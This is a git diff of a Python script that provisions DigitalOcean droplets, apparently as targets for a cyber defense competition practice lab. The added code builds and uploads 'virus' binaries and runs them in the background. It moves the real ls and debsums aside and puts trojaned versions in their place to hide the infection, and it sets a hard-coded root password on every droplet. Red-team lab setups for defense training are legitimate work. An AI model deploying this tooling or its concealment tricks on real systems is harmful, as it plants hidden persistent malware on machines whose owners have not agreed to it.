@@ -1,8 +1,12 @@
+#!/bin/python3
 import digitalocean
 import time
 import paramiko
 from scp import SCPClient
 import config
+from os import system
+
+system("cd david; cargo build --release --all; cd ..")
 
 count = 30
 
@@ -40,10 +44,31 @@ for idx, droplet in enumerate(droplets):
     c.connect(hostname=droplet.ip_address, username="root", pkey=k)
     i, o, e = c.exec_command("echo root:nuccdcpracticelab2017 | chpasswd")
 
-    scp = SCPClient(c.get_transport())
-    scp.put('virus.py', '/virus.py')
+    # David's virus 1
+    c.exec_command("apt-get -y install debsums")
 
-    i, o, e = c.exec_command("nohup python3 /virus.py %s &" % str(idx))
-    print('Done with droplet')
+time.sleep(5)
+
+for idx, droplet in enumerate(droplets):
+    droplet.load()
+    k = paramiko.RSAKey.from_private_key_file("/home/david/.ssh/id_rsa")
+    c = paramiko.SSHClient()
+    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    c.connect(hostname=droplet.ip_address, username="root", pkey=k)
+    # David's virus 2
+    c.exec_command("mv /bin/ls /realLS")
+    scp = SCPClient(c.get_transport())
+    scp.put('david/target/release/virus', '/var/virus')
+    scp.put('david/target/release/virus', '/virus')
+    scp.put('david/target/release/virus', '/var/virus')
+    c.exec_command("mv /usr/bin/debsums /realDebsums")
+    scp.put('david/target/release/debsums', '/usr/bin/debsums')
+    scp.put('david/target/release/ls', '/bin/ls')
+    scp.put('david/target/release/ls', '/usr/bin/ls')
+    scp.put('david/target/release/ls', '/sbin/ls')
+    scp.put('david/target/release/ls', '/usr/sbin/ls')
+    c.exec_command("echo %s > /virusNum" % str(idx))
+    c.exec_command("nohup /virus &")
+
 
 time.sleep(20)
